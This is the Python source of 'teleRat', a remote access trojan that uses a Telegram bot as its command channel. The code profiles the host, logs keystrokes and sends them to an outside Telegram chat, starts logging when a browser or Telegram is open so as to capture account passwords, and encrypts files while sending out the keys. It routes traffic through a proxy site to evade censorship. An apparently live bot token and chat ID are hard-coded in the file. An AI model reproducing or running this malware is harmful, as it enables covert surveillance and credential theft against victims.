'''Script Information
Version: 1.0.5
Author: Yakuza.D(daya)
Github: https://github.com/pythonInBlack/teleRat

'''
from banner_print import print_teleRat_banner 
#from ..modules.banner_print import print_dir_banner as dirBanner

import requests
from bs4 import BeautifulSoup
import json
#import time
import platform
#import os
import psutil
import subprocess
#import wmi
#import ngrok
from colorama import Fore, Back, Style
# import ipapi
# from telegram import Update
# from telegram.ext import Application, CommandHandler, ContextTypes
from pynput import keyboard
from cryptography.fernet import Fernet
from security import safe_requests

userIp  = ''
userLocation = ''
class TeleManager():
    def __init__(self, token, userId):
        self.lastCommand = ''
        self.token = token
        self.userId = userId
        self.userIp = ''
        self.userLocation = ''
        self.allCommands = ['2','34']
        self.keys = []
        self.procs = {}
        self.commonAccountProcessNames = ['Telegram.exe','chrome.exe','firefox.exe']
        self.keyData = []
        self.keyFilesData = []
        self.encryptFile = ''
    def ip_enum(self):
        '''
    summary 
    this function obtain user ip and then send request to obtain user location
    then if User in Iran Show Warning Message
    this is internal function to check location to deciding using normal mode or bypassing mode for sending meesage 
        '''
        global userIp
        global userLocation
        try:
            userIp = requests.get('https://api.ipify.org').text
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + '[-] IP Enum => Cant Get machine IP address, seem Internet Connection Error')
            return False
        
        httpDebuggerUrl = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://ipapi.co/{userIp}/country/',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        try:
            response = requests.post(httpDebuggerUrl, data=payload)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.content.decode(),'html.parser')
                
                #find <div id='ResultData'> tag contain result => User IP Country
                divTagResult = soup.findAll('div', attrs={'id':'ResultData'})
                
                #Conver tag finded to string then Slicing to extraxt Country Code 
                ipCountry = str(divTagResult)[151:-14].replace(' ','').replace("\n",'') 
                #Store IP Country in global variable userLocation
                userLocation = ipCountry
                
                #Print Warning message and Country Code
                if "IR" not in str(divTagResult):
                    return True
                elif "IR" in str(divTagResult):
                    print(Fore.YELLOW + f'[+] IP Enum => You are in {ipCountry} and Iran is Unsupported Country => ' \
                        +Fore.LIGHTCYAN_EX+f'So We Use Tunnel to sending Requests'+Style.RESET_ALL)
                    print(Fore.LIGHTGREEN_EX+"[+] IP Enum => Request send using Tunnel."+Style.RESET_ALL)
                    return False
                
                #Store Results and Return
                self.userIp = userIp
                self.userLocation = userLocation
                return {'ip':userIp,'country':userLocation} 

                    
        #Handle ip_eum() Errors
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + '[-] IP Enum => Internet Connection Error!!!'+Style.RESET_ALL)
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] IP Enum => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
        
    def send_message_normal_mode(self, msg):
        '''summary:
        this function send message to telegram bot ordinary Mode
        '''
        url = f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}'
        
        try:
            response = safe_requests.get(url)
            if response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + '[+] Message Sender => Message Sent Successfully on Normal Mode!'+Style.RESET_ALL)
                return True
            else:
                print(Fore.LIGHTRED_EX + '[-] Message Sender => Failed to send message. try again!!! Status code:' \
                    + Fore.LIGHTYELLOW_EX + response.status_code)
        except requests.RequestException:
            print(Fore.LIGHTRED_EX + '[-] Message Sender => Internet Connection Error!!!')
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Message Sender => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
           
    def send_message_bypass_mode(self, msg): 
        '''summary:
        this function send message to telegram bot in Bypass Mode 
        actully function can Filtering in iran
        '''
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print(Fore.LIGHTGREEN_EX + '[+] Message Sender Bypass Mode => Message Sent Successfully!'+Style.RESET_ALL)
            return True
        
    def send_message(self, msg):
        '''summary:
        this function deciding to send message to telegram bot base on country Code
        if client side Location(where python script is running) is Iran then use bypass mode
        '''
        if self.ip_enum():
            self.send_message_normal_mode(msg)
            return True
        else:
            self.send_message_bypass_mode(msg)
            return True
  
    def os_enum(self):
        '''summary:
        this function return os name, version, OS CPU and User Information
        then send it to T-Bot
        '''

        #Get User All Information
        #userInfo = platform.uname()

        osCpu = subprocess.getoutput('wmic cpu get name')
        osCpuFormated = osCpu.replace('Name','').replace('\n','').replace(' ','')
        
        clienSideLoc = self.ip_enum()
        
        osEnum = f''' OS Enumeration Result: ✅
            Target {userIp} in {userLocation} =>
            Operation System: {platform.system()} 💻
            OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
            Host Name: {platform.uname().node} 
            OS CPU Family: {platform.processor()} => {platform.uname().machine}            
            OS CPU Model: {osCpuFormated}
            OS Detailed Version: {platform.win32_ver()}
            
            ---------------\\\\*******//---------------
            🥷 Hi Ninja .... 🥷👋
            Enter /list To See All Bot Commands 
            Enter /none to Run New Command
        '''
        print(Fore.LIGHTGREEN_EX+f'[+] OS Enum => \n'+Style.RESET_ALL+osEnum)
         
        if clienSideLoc: #client side not in iran
            self.send_message(osEnum)
            
        else: #client side in iran
            self.send_message_bypass_mode(osEnum)
            
        #sendMsg = self.send_message_bypass_mode(enumPm)
        return osEnum
        
    def last_command_bypass_mode(self):
        '''summary
        This function get last message sended to bot and return it
        send request using tunnel say Bypass Mode
        '''
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/getUpdates',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        try:
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                #Parse Response html code
                soup = BeautifulSoup(response.content.decode(),'html.parser')
                
                #Find div tag contain Result of Response
                result = soup.findAll('div', attrs={'id':'ResultData'}) #result = soup.findAll('pre')

                #Slicing to get Result of Response only
                res2 = str(result)[151:-14]
                
                #Convert slicing string to dictionry to get last text
                resultAsDict = json.loads(res2)
                lastCmd = resultAsDict['result'][-1]['message']['text']
                
                #Function return and Outputs
                self.lastCommand = lastCmd
                print(Fore.LIGHTGREEN_EX+f'[+] Last Command Bypass Mode => from Bot: {self.lastCommand}'+Style.RESET_ALL)
                
                for cmd in resultAsDict['result']:
                    self.allCommands.append(cmd['message']['text'])
                
                return lastCmd
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => Internet Connection Error!!!'+Style.RESET_ALL)
        except IndexError:
            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => No Command Found!!!'+Style.RESET_ALL)
        except Exception as e:
            print(Fore.LIGHTMAGENTA_EX + '[-] Last Command Bypass Mode => Unknown Error happened...'+Style.RESET_ALL)
            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
                   
    def last_command_normal_mode(self):
        '''summary
        This function get Last Command in Normal Mode 
        '''
        url = f'https://api.telegram.org/bot{self.token}/getUpdates'
        
        try:
            response = safe_requests.get(url)
            if response.status_code == 200:
                lastCmd = response.json()['result'][-1]['message']['text']
                print(Fore.LIGHTGREEN_EX+f'[+] Last Command => from Bot: {lastCmd}'+Style.RESET_ALL)
                self.lastCommand = lastCmd

                for cmd in response.json()['result']:
                    self.allCommands.append(cmd['message']['text'])

                return lastCmd
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + '[-] Last Command => Internet Connection Error!!!'+Style.RESET_ALL)
        
        except IndexError:
            print(Fore.LIGHTRED_EX + '[-] Last Command Bypass Mode => No Command Found!!!'+Style.RESET_ALL)
        
        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Last Command => Unknown error in IP Location Checking happened!!! \n'+Style.RESET_ALL)
            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
       
    def last_command(self):
        '''summary
        This function get Last Command in Normal Mode
        '''
        if self.ip_enum(): #client side not in iran
            self.last_command_normal_mode()
        else: #client side in iran
            self.last_command_bypass_mode()
            
    def all_commands(self):
        num = 1
        print(Fore.LIGHTGREEN_EX+f'[+] All Commands => \n'+Style.RESET_ALL)
        for x in self.allCommands:
            print(Fore.YELLOW+f'[+] Command-{num} =>'+Fore.LIGHTWHITE_EX+ x +Style.RESET_ALL)
            num += 1
            
        return self.allCommands
    
    def keyboard_log(self,key):    
         # Check for CTRL+C  
        if key == keyboard.Key.ctrl_r:  
            print(Fore.GREEN + '[+] Key Logger - Right-CTRL Detected, Exiting...' + Style.RESET_ALL)
            if len(self.keys) > 0:  
                self.send_message(f'Keylogger Stopped ⛔, Until Now Target Pressed => \n{self.keys}')
                self.keys.clear()
            return False
            
    
            
        #Check Character key pressed
        if type(key) == keyboard._win32.KeyCode:
            print(f'Pressed: {key.char}')
            key = key.char 
            self.keys.append(key)
        
        #Append Special Key pressed
        #self.keys.append(str(key))
        
        #send if 10 key pressed
        if len(self.keys) == 25:
            print(Fore.YELLOW + '[+] Key Logger - 25 Key Pressed, Now Sending to T-Bot...' +Style.RESET_ALL)
            self.send_message(str(self.keys))
            self.keys.clear()
                 
    def keyboard_start(self):
        print(Back.LIGHTWHITE_EX+Fore.BLACK + '[+] Key Logger - Key Logging Started, Press Right-CTRL to Stop Logger ' +Style.RESET_ALL)
        
        try:
            with keyboard.Listener(on_press=self.keyboard_log) as listener:
                listener.join()
        except KeyboardInterrupt:
            print(Fore.LIGHTRED_EX + '[-] Keyboard Logger => Exit !!!'+Style.RESET_ALL)

    def procss_list(self):
        pids = psutil.pids()
        
        for pid in pids:
            self.procs.update({psutil.Process(pid).name():pid})
        
        print(Fore.LIGHTGREEN_EX+f'[+] Process List => \n'+Style.RESET_ALL)

        for name,pid in self.procs.items():
            print(Fore.YELLOW+f'[+] Process => '+Fore.LIGHTWHITE_EX+ name + f' {pid}' +Style.RESET_ALL)
        
        return self.procs
    
    def log_accounts(self):
        try:
            #print(Back.LIGHTYELLOW_EX+Fore.BLACK+f'[+] Accounts KeyLogger(telegram, chrome, ...) =>  \n'+Style.RESET_ALL)
            pids = psutil.pids()
            procNames = []
            for pid in pids:
                procNames.append(psutil.Process(pid).name())
            
            matched_pairs = [(i, j) for i in self.commonAccountProcessNames for j in procNames if i == j]
            print(Fore.YELLOW+f'[+] Accounts KeyLogger for => '+Style.RESET_ALL,end='')
            for pair in matched_pairs:
                print(Back.LIGHTWHITE_EX+Fore.BLACK+f' {pair[0]} -',end='')
            print(Style.RESET_ALL+'\n')
            
            for proc in self.commonAccountProcessNames:
                if proc in procNames:
                    self.keyboard_start()
                    return True
            else:
                print(Fore.LIGHTRED_EX + '[-] Accounts KeyLogger => No Special Process Found!!!'+Style.RESET_ALL)
                return False
        
        except KeyboardInterrupt:
            print(Fore.LIGHTRED_EX + '[-] Keyboard Logger => Exit !!!'+Style.RESET_ALL)

        except Exception as e:
            print(Fore.LIGHTRED_EX + '[-] Accounts KeyLogger => Unknown Error happened...'+Style.RESET_ALL)
            print(Fore.LIGHTWHITE_EX+f'Error Content: {e}'+Style.RESET_ALL)
    
    def text_encryptor(self):
        print(Back.WHITE+Fore.BLACK+f'[🔐] Text Encryptor => '+Style.RESET_ALL+'\n')
        text = input(Fore.YELLOW+'[+] Encryptor => Enter text to be Encrypted: '+Style.RESET_ALL)

        key = Fernet.generate_key()

        encryptData = Fernet(key).encrypt(text.encode())

        with open("key_data.txt","w") as f:
            f.write('Key: \n')
            f.write(f'{key.decode()}\n')
            f.write('Data Content: \n')
            f.write(f'{encryptData.decode()}\n')

        subprocess.Popen("notepad .\\key_data.txt", shell=True)

        print(f'[+] Encryptor => Your Key Is: {key.decode()} \n')
        print(f'[+] Encryptor => Encrypted Data Is: {encryptData.decode()} \n')

        #keyData = []
        with open("key_data.txt","r") as f:
            for line in f:
                self.keyData.append(line.strip())
        #Send key and encrypted data to bot
        self.send_message(f'[+] Encryptor => Original Text {text} \nDecryption Key 🔑 Is: \n{key.decode()} \n'+f'[+] Encryptor => Encrypted Data 🔐 Is: \n{encryptData.decode()} \n')
    
        #keyUsed = b'SeExLvFTMx0Cxq5caUq1XSbpUYTB06kjb07y8NwIZp4='
        #encData = b'gAAAAABmy5AMSPIeyohe_uFlBqphCLMOjFt_eQSTZMCTUcixuey5WSGoIYXE5ECxM1wOTpz51RjDph6Fh7LAkIr3hLUahKSxSw=='
        
        decryptor = Fernet(self.keyData[1]).decrypt(self.keyData[3])
        
        print(Fore.LIGHTCYAN_EX+f'[+] Encryptor => Decrypted Data Is: {decryptor.decode()} \n')
        
        #self.send_message(f'[+] Encryptor => {"data":decryptor.decode()} \n{"key":key.decode()} \n{"encryptData":encryptData.decode()} \n')
        
        return {"data":decryptor.decode(),"key":key.decode(),"encryptData":encryptData.decode()}
    
    def text_decryptor(self):
        key = input(Fore.YELLOW+'[+] Text Decryptor => Paste Key: '+Style.RESET_ALL+'\n')
        data = input(Fore.YELLOW+'[+] Text Decryptor => Paste Encrypted Data: \n'+Style.RESET_ALL)
        
        decryptor = Fernet(key).decrypt(data)
        print(Fore.LIGHTCYAN_EX+f'[+] Text Decryptor => Decrypted Data Is: {decryptor.decode()} \n')
        
        return {"data":decryptor.decode(),"key":key.decode(),"encryptData":data.decode()}

    def file_encryptor(self):
        path = input('[+] File Encryptor => Enter file path to be Encrypted: ')
        with open(rf'{path}','rb') as f:
            dataFile = f.read()
        
        key = Fernet.generate_key()
        
        encryptData = Fernet(key).encrypt(dataFile)
        
        self.keyFilesData.append(key.decode())
        self.keyFilesData.append(encryptData.decode())
        self.encryptFile = path
        print(f'[+] File Encryptor => File Encrypted & Encryption Key Is: {key.decode()} \n')
        
        self.send_message(f'[+] File Encryptor => File Encrypted: {path} \n & Encryption Key Is: {key.decode()} \n')
        
        #Write key to file
        with open("key_data.txt","w") as f:
            f.write('Key: \n')
            f.write(f'{key.decode()}\n')
            f.write('Data Content: \n')
            f.write(f'{encryptData.decode()}\n')
        
        subprocess.Popen("notepad .\\key_data.txt", shell=True)
            
        #Write Encrypted Data to file
        with open(rf'{path}','wb') as encryptFile:
            encryptFile.write(encryptData)
        
    def file_decryptor(self, key=''):
        print(Back.BLUE+Fore.YELLOW+f'[+] File Decryptor => Leave key Empty to Decrypt Last Encrpted file.'+Style.RESET_ALL+'\n')
        key = input(Fore.YELLOW+'[+] File Decryptor => Paste Encryption Key: '+Style.RESET_ALL)
        
        if key == "":
            fileExt = self.encryptFile.split('.')[1]
            decryptor = Fernet(self.keyFilesData[0]).decrypt(self.keyFilesData[1])
            print(f'[+] File Decryptor => File Decrypted & Decryption Key Is: \n{self.keyFilesData[0]} \n')
            
            with open(rf'{self.encryptFile}_decrypted.{fileExt}','wb') as decryptFile:
                decryptFile.write(decryptor)
                
            subprocess.Popen(rf'start ./{self.encryptFile}_decrypted.{fileExt}', shell=True)
            
        else:
            encryptedData = input('[+] File Decryptor => Enter path of Encrypted File: ')
            fileExt = encryptedData.split('.')[1]
            
            with open(encryptedData,'rb') as f:
                dataFile = f.read()
                
            decryptor = Fernet(key.encode()).decrypt(dataFile)
            
            print(f'[+] File Decryptor => File Decrypted & Decryption Key Is: \n{key[1]} \n')
            with open(rf'{encryptedData}_decrypted.{fileExt}','wb') as decryptFile:
                decryptFile.write(decryptor)
            
            subprocess.Popen(rf'start ./{encryptedData}_decrypted.{fileExt}', shell=True)
        #decryptor()

        # with open(rf'{path}','wb') as f:
        #     f.write(encryptData)

    def list_command(self):
        '''summary
        This function send List of Commands to user
        '''
        #subprocess.Popen('neofetch')
        #os.system('neofetch')
        
        listCmd = f'''
        /list => Show List of Commands
        /send => Send New Message 
        /none => Run New Command
        /os => Get OS Information
        /ip => Get IP Information
        /help => Get Help
        /exit => Exit from Bot
        '''
        print(Fore.LIGHTYELLOW_EX+listCmd+Style.RESET_ALL)
        return listCmd
        #self.send_message(listCmd)
        #self.allCommands.append(listCmd)
    
    def usage_options(self):
        userInput = ''
        options = '''
        -----------------------------------------------------------------------
        [0] => Send Message 
        [1] => OS Enumeration 
        [2] => IP Enumeration 
        [3] => Last Command from Bot 
        [4] => All Commands from Bot 
        [5] => Keyboard Logger
        [6] => Process List
        [7] => Logged Accounts Passwords
        [8] => Text Encryptor && [88] Text Decryptor
        [9] => File Encryptor && [99] File Decryptor
         
        🥷
        [q] => Exit with Notification 👋👋👋
        [sq] => Silent Exit👋👋👋
        [h] => Help - All T-Bot Command List
        '''
        print(options)
        #Get User Input
        
        userInput = str(input(Fore.LIGHTMAGENTA_EX + 'Select Option: ' + Style.RESET_ALL))

        #Check User Input
        if userInput == '0':
            return 'send', 0
        
        elif userInput == '1':
            return 'osenum', 1
        
        elif userInput == '2':
            return 'ipenum', 2
        
        elif userInput == '3':
            return 'lastcmd', 3
        
        elif userInput == '4':
            return 'allcmd', 4
        
        elif userInput == '5':
            return 'keylogger', 5
        
        elif userInput == '6':
            return 'procs', 6
        
        elif userInput == '7':
            return 'logacc', 7
        
        elif userInput == '8':
            return 'textencrypt', 8
        elif userInput == '88':
            return 'textdecrypt', 88

        elif userInput == '9':
            return 'fileencrypt', 9

        elif userInput == '99':
            return 'filedecrypt', 99
        
        
        elif userInput.lower() == 'h':
            return 'help', 'h'
            
        elif userInput.lower() == 'q':
            self.exit_bot()
        elif userInput.lower() == 'sq':
            exit()
        else:
            print(Fore.LIGHTRED_EX + '[-] Usage Options => Invalid Command!!!'+Style.RESET_ALL)
            self.usage_options()
            
    def exit_bot(self):
        '''summary
        This function exit from Bot
        '''
        print(Fore.CYAN + 'Goodbye Ninja 🥷.... 👋 👋 👋\n'+Style.RESET_ALL)
        self.send_message('Client Side python script Shuting down...! 📴 ')
        exit()
        

        
def bot_runner():
    token = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'
    #botUsername = 'davoodya_bot'
    #botUrl = f'https://api.telegram.org/bot{token}/GetUpdates'
    dayaId = '673330561'
    #msg = input(Back.MAGENTA+Fore.WHITE+'Enter your message: '+Style.RESET_ALL)
    
    telegram = TeleManager(token=token, userId=dayaId)
    while True:
        option = telegram.usage_options()
        if option[0] == 'send':
            msg = input(Fore.YELLOW+'Enter your message: '+Style.RESET_ALL)
            telegram.send_message(msg)
            continue
            
        elif option[0] == 'osenum':
            telegram.os_enum()
            continue
            
        elif option[0] == 'ipenum':
            telegram.ip_enum()
            continue
        
        elif option[0] == 'lastcmd':
            telegram.last_command()
            continue
            
        elif option[1] == 4:  #Check this Condition (all commands)
            telegram.all_commands()
            
            #telegram.all_command_normal_mode()
            continue
        
        elif option[0] == 'keylogger':
            #Check this Condition (all commands)
            telegram.keyboard_start()
            #telegram.all_command_normal_mode()
            continue
        
        elif option[0] == 'help':
            telegram.list_command()
            continue
        
        elif option[0] == 'procs':
            telegram.procss_list()
            continue
        elif option[0] == 'logacc':
            telegram.log_accounts()
            continue
        
        elif option[0] == 'textencrypt':
            telegram.text_encryptor()
            continue
        elif option[0] == 'textdecrypt':
            telegram.text_decryptor()
            continue
        
        elif option[0] == 'fileencrypt':
            telegram.file_encryptor()
        elif option[0] == 'filedecrypt':
            telegram.file_decryptor()
        
        #telegram.send_message(telegram.os_enum())
def rat_runner():
    import asyncio
    token = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'
    #botUsername = 'davoodya_bot'
    #botUrl = f'https://api.telegram.org/bot{token}/GetUpdates'
    dayaId = '673330561'
    
    #actions = TeleRat(token=token, userId=dayaId)
    #actions.send_message('Hello World!')
    #actions.tester()
    
    #teleHandler = BotHandler(token=token)
    #asyncio.run(teleHandler.main())
    
    #telegram = TeleManager(token=token, userId=dayaId)
    
    

def main():
    try:
        bot_runner()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + '[-] CTRL+C Detecting => Exit !!!'+Style.RESET_ALL)

if __name__ == '__main__':
    try:
        print_teleRat_banner()
        input(Back.WHITE+Fore.BLACK+ "Welcom to 'T-Rat CLI Dashboard' Ninja 🥷 "+ Back.RESET+Fore.LIGHTWHITE_EX+' Press Enter to Start...'+Style.RESET_ALL+'\n')
        main()
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + '[-] CTRL+C Detecting => Exit !!!'+Style.RESET_ALL)

